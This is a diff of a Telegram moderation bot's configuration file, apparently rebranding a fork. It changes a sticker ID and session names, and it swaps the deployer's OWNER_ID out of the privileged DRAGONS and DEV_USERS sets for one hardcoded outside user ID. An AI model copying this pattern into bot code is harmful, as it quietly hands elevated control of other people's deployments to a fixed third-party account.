@@ -82,7 +82,7 @@ if ENV:
     DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))
     WORKERS = int(os.environ.get("WORKERS", 8))
-    BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
+    BAN_STICKER = os.environ.get("BAN_STICKER", "CAACAgUAAxkBAAIFImFmcFbKGHEXzCBkCbWO9eieUJ7oAAKxAANPqVBWsQYOqpQMQFEhBA")
     ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
     CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -172,10 +172,10 @@ else:
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
-DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1781945165)
-DEV_USERS.add(1669178360)
+DRAGONS.add(412094015)
+DEV_USERS.add(412094015)
+DEV_USERS.add(412094015)
+DEV_USERS.add(412094015)
 
 if not SPAMWATCH_API:
     sw = None
@@ -189,8 +189,8 @@ else:
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("layla", API_ID, API_HASH)
-pbot = Client("robot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
+telethn = TelegramClient("zaid", API_ID, API_HASH)
+pbot = Client("zaid", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
